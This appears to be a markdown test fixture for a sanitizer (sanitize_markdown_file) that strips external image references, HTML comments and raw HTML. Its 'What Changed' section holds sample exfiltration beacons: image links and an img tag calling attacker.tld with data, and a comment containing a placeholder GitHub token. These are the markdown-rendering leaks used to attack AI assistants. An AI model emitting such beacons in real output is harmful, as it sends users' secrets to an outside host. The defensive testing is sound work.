# Test Bundle — Markdown Exfil Beacons

## Goal

Test RPT-04 sanitizer strips external image refs, HTML comments, raw HTML,
and reference-style image definitions.

## Where Worked

sanitize_markdown_file in bin/claude-secure

## What Changed

Injected beacon: ![alt](https://attacker.tld/?data=x)
Also: <!-- DOCS_REPO_TOKEN=ghp_should_be_redacted_first -->
Also: <img src="https://attacker.tld/b.gif" alt="x"/>
Also reference: ![ref][exfil]

[exfil]: https://attacker.tld/refdef

## What Failed

None.

## How to Test

bash tests/test-phase24.sh test_bundle_sanitizes_external_image

## Future Findings

None.
